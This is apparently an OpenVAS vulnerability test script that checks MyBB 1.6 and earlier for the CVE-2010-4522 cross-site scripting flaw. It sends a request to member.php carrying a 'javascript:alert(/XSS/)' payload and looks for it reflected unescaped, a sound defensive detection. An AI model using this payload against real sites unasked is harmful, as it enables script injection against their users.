###############################################################################
# OpenVAS Vulnerability Test
#
# MyBB Multiple Sross-Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:mybb:mybb";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801684");
  script_version("2022-02-17T14:14:34+0000");
  script_tag(name:"last_modification", value:"2022-02-17 14:14:34 +0000 (Thu, 17 Feb 2022)");
  script_tag(name:"creation_date", value:"2011-01-08 10:30:18 +0100 (Sat, 08 Jan 2011)");
  script_cve_id("CVE-2010-4522");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("MyBB Multiple Cross-Site Scripting Vulnerabilities");

  script_xref(name:"URL", value:"http://openwall.com/lists/oss-security/2010/12/22/2");
  script_xref(name:"URL", value:"http://openwall.com/lists/oss-security/2010/12/20/1");
  script_xref(name:"URL", value:"http://blog.mybb.com/2010/12/15/mybb-1-6-1-release-1-4-14-update/");
  script_xref(name:"URL", value:"http://yehg.net/lab/pr0js/advisories/[mybb1.6]_cross_site_scripting");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("sw_mybb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("MyBB/installed");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to inject arbitrary web script
  or HTML.");

  script_tag(name:"affected", value:"MyBB 1.6 and prior.");

  script_tag(name:"insight", value:"The flaws are caused by improper validation of user-supplied input via
  vectors related to 'editpost.php', 'member.php', and 'newreply.php'.");

  script_tag(name:"solution", value:"Upgrade to MyBB version 1.6.1 or later.");

  script_tag(name:"summary", value:"MyBB is prone to multiple cross-site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/member.php?action=login&url=javascript:alert%28/XSS/%29";

if(http_vuln_check(port:port, url:url, pattern:'<input type="hidden" name="url" value="javascript:alert\\(/XSS/\\)" />', check_header:TRUE)) {
  report  = http_report_vuln_url(port:port, url:url);
  report += '\nNote: The XSS is only "triggered" upon a successful login.';
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
